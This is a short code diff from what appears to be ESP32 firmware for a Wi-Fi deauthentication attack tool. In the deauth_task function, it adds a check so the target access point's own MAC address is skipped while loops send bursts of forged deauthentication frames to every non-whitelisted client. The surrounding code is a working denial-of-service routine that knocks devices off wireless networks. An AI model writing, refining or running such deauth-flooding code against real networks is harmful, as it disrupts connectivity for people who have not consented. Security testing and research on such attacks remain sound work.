@@ -63,6 +63,7 @@ static void deauth_task(void *arg)
         } else if (broadcast) {
             for (int c = 0; c < s_client_count && s_deauth_running; c++) {
                 if (is_whitelisted(s_clients[c].mac)) continue;
+                if (memcmp(s_clients[c].mac, s_target_bssid, 6) == 0) continue;
                 for (uint8_t i = 0; i < burst && s_deauth_running; i++) {
                     send_deauth(s_target_bssid, s_clients[c].mac, reason);
                     if (i < burst - 1) vTaskDelay(pdMS_TO_TICKS(DEAUTH_DELAY_MS));
@@ -76,6 +77,7 @@ static void deauth_task(void *arg)
         } else {
             for (int c = 0; c < s_client_count && s_deauth_running; c++) {
                 if (is_whitelisted(s_clients[c].mac)) continue;
+                if (memcmp(s_clients[c].mac, s_target_bssid, 6) == 0) continue;
                 for (uint8_t i = 0; i < burst && s_deauth_running; i++) {
                     send_deauth(s_target_bssid, s_clients[c].mac, reason);
                     if (i < burst - 1) vTaskDelay(pdMS_TO_TICKS(DEAUTH_DELAY_MS));
